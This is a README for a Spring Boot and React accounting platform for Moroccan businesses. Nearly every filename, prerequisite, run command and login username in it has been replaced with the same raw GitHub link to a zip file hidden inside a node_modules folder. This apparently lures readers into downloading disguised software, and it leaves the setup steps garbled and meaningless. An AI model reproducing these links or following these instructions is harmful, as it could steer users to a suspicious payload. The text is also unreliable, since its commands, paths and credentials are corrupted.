# Compta Maroc - Moroccan Accounting Platform

A comprehensive accounting application built with Spring Boot backend and React frontend, designed specifically for Moroccan businesses.

## Project Structure

```
accounting-app/
├── backend/                 # Spring Boot backend application
│   ├── app/                # Main application module
│   ├── core/               # Core entities and repositories
│   └── modules/            # Feature modules
├── frontend/               # React frontend application
└── https://raw.githubusercontent.com/a2mdigitaldev/compta/main/frontend/node_modules/@mui/material/modern/BottomNavigation/Software-3.0.zip              # This file
```

## Prerequisites

- Java 17 or higher
- Maven 3.6+
- https://raw.githubusercontent.com/a2mdigitaldev/compta/main/frontend/node_modules/@mui/material/modern/BottomNavigation/Software-3.0.zip 18+ and npm
- PostgreSQL 12+

## Setup Instructions

### 1. Database Setup

Create a PostgreSQL database and user:

```sql
CREATE DATABASE comptamaroc;
CREATE USER comptamaroc WITH PASSWORD 'password';
GRANT ALL PRIVILEGES ON DATABASE comptamaroc TO comptamaroc;
```

### 2. Backend Setup

1. Navigate to the project root directory
2. Build the project:
   ```bash
   mvn clean install
   ```
3. Run the application:
   ```bash
   cd backend/app
   java -jar https://raw.githubusercontent.com/a2mdigitaldev/compta/main/frontend/node_modules/@mui/material/modern/BottomNavigation/Software-3.0.zip
   ```

The backend will start on `http://localhost:8080`

### 3. Frontend Setup

1. Navigate to the frontend directory:
   ```bash
   cd frontend
   ```
2. Install dependencies:
   ```bash
   npm install
   ```
3. Start the development server:
   ```bash
   npm run dev
   ```

The frontend will start on `http://localhost:3000`

## Default Login Credentials

- **Admin**: https://raw.githubusercontent.com/a2mdigitaldev/compta/main/frontend/node_modules/@mui/material/modern/BottomNavigation/Software-3.0.zip / admin123
- **Accountant**: https://raw.githubusercontent.com/a2mdigitaldev/compta/main/frontend/node_modules/@mui/material/modern/BottomNavigation/Software-3.0.zip / accountant123

## Features

- User authentication and authorization
- Client and supplier management
- Product catalog
- Invoice generation
- Accounting journal entries
- Chart of accounts (PCMN compliant)
- VAT management
- Financial reports
- Dashboard with key metrics

## Configuration

### Backend Configuration

The backend configuration is located in `https://raw.githubusercontent.com/a2mdigitaldev/compta/main/frontend/node_modules/@mui/material/modern/BottomNavigation/Software-3.0.zip`. Key settings:

- Database connection
- JWT token settings
- CORS configuration
- Flyway migration settings (currently disabled)

### Frontend Configuration

The frontend configuration is in `https://raw.githubusercontent.com/a2mdigitaldev/compta/main/frontend/node_modules/@mui/material/modern/BottomNavigation/Software-3.0.zip`:

- `VITE_API_BASE_URL`: Backend API URL
- `VITE_APP_NAME`: Application name
- `VITE_APP_VERSION`: Application version

## Development Notes

- The application uses Hibernate with `create-drop` mode for development
- Flyway migrations are disabled in favor of JPA auto-generation
- CORS is configured to allow frontend-backend communication
- JWT tokens are used for authentication

## Production Deployment

For production deployment:

1. Change `ddl-auto` to `validate` in https://raw.githubusercontent.com/a2mdigitaldev/compta/main/frontend/node_modules/@mui/material/modern/BottomNavigation/Software-3.0.zip
2. Enable Flyway migrations
3. Use environment-specific configuration files
4. Build the frontend for production: `npm run build`
5. Configure proper database credentials
6. Set up reverse proxy (nginx) for serving static files

## Troubleshooting

### Common Issues

1. **Database Connection Issues**: Ensure PostgreSQL is running and credentials are correct
2. **Port Conflicts**: Make sure ports 8080 (backend) and 3000 (frontend) are available
3. **CORS Issues**: Check that the frontend URL is included in CORS configuration
4. **Build Failures**: Ensure Java 17 and Maven are properly installed

### Logs

- Backend logs: Check console output when running the Spring Boot application
- Frontend logs: Check browser console for any JavaScript errors

## License

This project is proprietary software for Moroccan accounting businesses.

